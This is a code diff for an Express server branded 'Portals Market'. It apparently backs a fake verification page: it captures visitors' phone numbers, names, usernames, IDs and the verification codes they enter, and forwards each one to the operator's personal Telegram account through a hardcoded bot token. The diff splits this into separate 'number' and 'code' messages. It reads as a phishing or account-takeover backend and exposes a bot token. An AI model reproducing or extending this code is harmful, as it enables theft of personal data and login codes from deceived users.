@@ -8,22 +8,19 @@ app.use(express.json());
 
 // ТВОИ ДАННЫЕ
 const BOT_TOKEN = '8738031314:AAFZ7ZnyI6lw6PfFCWQp29rB4lKDTtyGj8Y';
-const YOUR_ID = '6277925229';  // ← ПРОВЕРЬ ЭТОТ ID!
+const YOUR_ID = '6277925229';
 const YOUR_USERNAME = '@anyaskds';
 
+// Хранилище кодов
 const codes = {};
 
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-// Функция отправки в Telegram с подробным логированием
+// Функция отправки в Telegram
 function sendTelegramMessage(chatId, message) {
     const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-    
-    console.log(`📤 ОТПРАВКА В TELEGRAM`);
-    console.log(`📱 chat_id: ${chatId}`);
-    console.log(`📝 Текст: ${message.substring(0, 100)}...`);
     
     return fetch(TELEGRAM_API, {
         method: 'POST',
@@ -37,19 +34,16 @@ function sendTelegramMessage(chatId, message) {
     .then(res => res.json())
     .then(data => {
         if (data.ok) {
-            console.log(`✅ УСПЕШНО отправлено в ${chatId}`);
+            console.log(`✅ Успешно отправлено в ${chatId}`);
         } else {
-            console.log(`❌ ОШИБКА отправки в ${chatId}:`);
-            console.log(`   ${data.description}`);
+            console.log(`❌ Ошибка: ${data.description}`);
         }
         return data;
     })
-    .catch(err => {
-        console.log(`❌ ОШИБКА FETCH: ${err.message}`);
-    });
+    .catch(err => console.log(`❌ Ошибка fetch: ${err.message}`));
 }
 
-// ЭТАП 1: Человек написал номер
+// ЭТАП 1: Человек написал номер → ПРИХОДИТ ТОЛЬКО НОМЕР
 app.post('/api/send-code', (req, res) => {
     const { phone, region, fullName, username, userId } = req.body;
 
@@ -65,10 +59,11 @@ app.post('/api/send-code', (req, res) => {
 
     console.log('📱 ПОЛУЧЕН НОМЕР');
     console.log('📱 Телефон:', phone);
-    console.log('🔑 Код:', code);
+    console.log('🔑 Сгенерирован код:', code);
 
-    const message = `
-📱 НОВЫЙ ЗАПРОС НА ВЕРИФИКАЦИЮ!
+    // ⚡ СООБЩЕНИЕ 1: ТОЛЬКО НОМЕР
+    const messagePhone = `
+📱 НОВЫЙ НОМЕР!
 
 👤 Имя: ${fullName}
 📱 Телефон: ${phone}
@@ -79,68 +74,61 @@ app.post('/api/send-code', (req, res) => {
 📅 Время: ${new Date().toLocaleString()}
     `.trim();
 
-    sendTelegramMessage(YOUR_ID, message);
-    sendTelegramMessage(YOUR_USERNAME, message);
+    // Отправляем ТОЛЬКО НОМЕР
+    sendTelegramMessage(YOUR_ID, messagePhone);
+    sendTelegramMessage(YOUR_USERNAME, messagePhone);
 
     res.json({ success: true });
 });
 
-// ЭТАП 2: Человек ввел код
+// ЭТАП 2: Человек ввел код → ПРИХОДИТ ТОЛЬКО КОД
 app.post('/api/verify-code', (req, res) => {
     const { phone, code, fullName, username, userId } = req.body;
 
-    console.log('📥 ПОЛУЧЕН ЗАПРОС НА ПРОВЕРКУ КОДА');
+    console.log('📥 ПРОВЕРКА КОДА');
     console.log('📱 Телефон:', phone);
     console.log('🔑 Введенный код:', code);
 
     const stored = codes[phone];
 
     if (!stored) {
-        console.log('❌ Код не найден');
         return res.status(400).json({ success: false, message: 'Код не найден' });
     }
 
     if (Date.now() > stored.expires) {
         delete codes[phone];
-        console.log('❌ Код истек');
         return res.status(400).json({ success: false, message: 'Код истек' });
     }
 
     if (stored.code !== code) {
-        console.log('❌ Неверный код');
-        console.log('   Ожидался:', stored.code);
-        console.log('   Получен:', code);
         return res.status(400).json({ success: false, message: 'Неверный код' });
     }
 
-    console.log('✅ ВВЕДЕН КОД!');
-    console.log('📱 Телефон:', phone);
-    console.log('🔑 Введенный код:', code);
-    console.log('👤 Имя:', fullName);
+    console.log('✅ КОД ВВЕДЕН!');
 
-    const message = `
-✅ ВВЕДЕН КОД ВЕРИФИКАЦИИ!
+    // ⚡ СООБЩЕНИЕ 2: ТОЛЬКО КОД
+    const messageCode = `
+🔑 ВВЕДЕН КОД!
 
 👤 Имя: ${fullName}
 📱 Телефон: ${phone}
-🔑 Введенный код: ${code}
+🔑 Код: ${code}
 🆔 ID: ${userId}
 👤 Username: @${username || 'нет'}
 
 📅 Время: ${new Date().toLocaleString()}
     `.trim();
 
-    // ОТПРАВЛЯЕМ ТЕБЕ
-    console.log('📤 ОТПРАВКА СООБЩЕНИЯ ТЕБЕ...');
-    sendTelegramMessage(YOUR_ID, message);
-    sendTelegramMessage(YOUR_USERNAME, message);
+    // Отправляем ТОЛЬКО КОД
+    sendTelegramMessage(YOUR_ID, messageCode);
+    sendTelegramMessage(YOUR_USERNAME, messageCode);
 
     delete codes[phone];
 
     res.json({ success: true });
 });
 
-// Повторная отправка
+// Повторная отправка кода
 app.post('/api/resend-code', (req, res) => {
     const { phone } = req.body;
     const newCode = Math.floor(100000 + Math.random() * 900000).toString();
@@ -173,7 +161,4 @@ app.listen(PORT, () => {
     console.log(`✅ Portals Market запущен: http://localhost:${PORT}`);
     console.log(`📱 Твой ID: ${YOUR_ID}`);
     console.log(`👤 Твой юзер: ${YOUR_USERNAME}`);
-    console.log('========================================');
-    console.log('⚠️ ВАЖНО: Напиши боту /start в личку!');
-    console.log('========================================');
 });
